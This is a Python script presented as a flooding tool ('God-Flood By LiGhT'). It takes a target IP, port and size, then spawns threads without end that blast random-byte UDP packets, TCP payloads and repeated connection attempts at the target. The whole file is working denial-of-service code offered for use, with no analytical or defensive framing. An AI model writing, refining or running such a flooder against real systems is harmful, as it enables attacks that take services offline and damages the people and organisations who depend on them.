#!/usr/bin/env python3
import threading
import sys
import time
import random
import socket

if len(sys.argv) < 4:
    print("God-Flood By LiGhT")
    sys.exit("Usage: python3 "+sys.argv[0]+" <ip> <port> <size>")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])

class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        super().__init__()
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.syn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def run(self):
        for _ in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        super().__init__()
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def run(self):
        for _ in range(self.packets):
            try:
                bytes_data = random._urandom(self.size)
                self.tcp.connect((self.ip, self.port))
                self.tcp.sendall(bytes_data)
            except:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        super().__init__()
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    def run(self):
        for _ in range(self.packets):
            try:
                bytes_data = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes_data, (self.ip, self.port))
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip, port, size, packets)
        t = tcp(ip, port, size, packets)
        s = syn(ip, port, packets)
        u.start()
        t.start()
        s.start()
    except KeyboardInterrupt:
        print("Stopping Flood!")
        sys.exit()
    except socket.error as msg:
        print(f"Socket Error: {msg}")
        sys.exit()